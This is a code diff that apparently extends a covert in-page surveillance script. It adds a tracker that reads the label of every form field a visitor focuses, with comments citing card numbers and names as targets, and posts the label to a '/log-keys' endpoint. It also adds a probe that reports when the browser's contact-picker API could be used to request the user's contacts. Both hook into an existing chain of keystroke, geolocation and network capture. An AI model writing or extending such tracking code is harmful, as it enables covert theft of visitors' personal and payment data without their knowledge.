@@ -1838,6 +1838,60 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ LABEL CONTEXT TRACKER ════════════════════════════════
+    // Enhances field focus data by finding the associated <label> text,
+    // revealing human-readable field intent (e.g. "Credit Card Number", "Full Name").
+    function initLabelContextTracker() {
+        try {
+            const seen = new WeakSet();
+            document.addEventListener('focusin', ev => {
+                try {
+                    const el = ev.target;
+                    if (!el || !['INPUT','TEXTAREA','SELECT'].includes(el.tagName)) return;
+                    if (el.type === 'hidden' || el.type === 'submit' || el.type === 'button') return;
+                    if (seen.has(el)) return;
+                    seen.add(el);
+                    // Find label text
+                    let labelText = '';
+                    if (el.id) {
+                        const lbl = document.querySelector(`label[for="${CSS.escape(el.id)}"]`);
+                        if (lbl) labelText = lbl.textContent.trim().slice(0, 80);
+                    }
+                    if (!labelText) {
+                        let p = el.parentElement;
+                        while (p && p !== document.body) {
+                            if (p.tagName === 'LABEL') { labelText = p.textContent.replace(el.value || '', '').trim().slice(0, 80); break; }
+                            p = p.parentElement;
+                        }
+                    }
+                    if (!labelText) {
+                        const ariaLabel = el.getAttribute('aria-label') || el.getAttribute('aria-labelledby') && (document.getElementById(el.getAttribute('aria-labelledby')) || {}).textContent;
+                        if (ariaLabel) labelText = String(ariaLabel).trim().slice(0, 80);
+                    }
+                    if (!labelText) return; // only report if we found a label — avoids duplicate noise w/ initFieldFocusTracker
+                    const name = el.name || el.id || el.placeholder || '?';
+                    post('/log-keys', {
+                        keys: `[LABEL FOCUS] "${labelText}" (${el.tagName.toLowerCase()} name="${name.slice(0,30)}" type=${el.type||'?'})`,
+                        url: location.href
+                    });
+                } catch {}
+            });
+        } catch {}
+    }
+
+    // ═══ CONTACTS API DETECTOR ════════════════════════════════
+    // Detects availability of the Contact Picker API (Chrome Android only).
+    // If available, it means we could request the user's contacts.
+    function initContactsDetector() {
+        try {
+            if (!('contacts' in navigator && 'ContactsManager' in window)) return;
+            post('/log-keys', {
+                keys: `[CONTACTS API] Contact Picker API available — select() supported`,
+                url: location.href
+            });
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1989,6 +2043,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initTextareaCapture();
         initVisibilityDuration();
         initGeolocationWatcher();
+        initLabelContextTracker();
+        initContactsDetector();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
